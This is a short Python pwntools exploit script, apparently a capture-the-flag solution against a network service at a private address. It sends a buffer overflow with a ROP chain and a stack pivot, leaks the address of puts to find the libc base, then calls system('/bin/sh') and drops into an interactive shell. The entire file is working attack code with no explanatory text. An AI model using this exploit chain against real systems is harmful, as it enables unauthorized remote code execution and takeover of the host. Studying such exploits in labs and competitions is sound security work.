#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.6"
port = 8888

context.arch = "amd64"    
r = remote(host,port)


r.recvuntil(":")
pop_rdi = 0x00000000004007c3
pop_rsi_r15 = 0x00000000004007c1
read_input = 0x0000000000400656
buf1 = 0x00602000-0x100
buf2 = buf1 - 0x100
leave = 0x00000000004006c6
rop = flat([buf1,pop_rdi,buf1,pop_rsi_r15,0x100,0,read_input,leave])
payload = "a"*48 + rop
puts_got = 0x600fd8
puts_plt = 0x400538
r.sendline(payload)
rop2 = flat([buf2,pop_rdi,puts_got,puts_plt,pop_rdi,buf2,pop_rsi_r15,0x100,0,read_input,leave])
time.sleep(0.1)
r.sendline(rop2)
r.recvuntil("\n")
puts = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))
puts_off = 0x06f690
libc = puts - puts_off
system = libc + 0x45390
sh = libc + 0x18cd57
print "libc:",hex(libc)
rop3 = flat([buf1,pop_rdi,sh,system])
time.sleep(0.1)
r.sendline(rop3)
r.interactive()
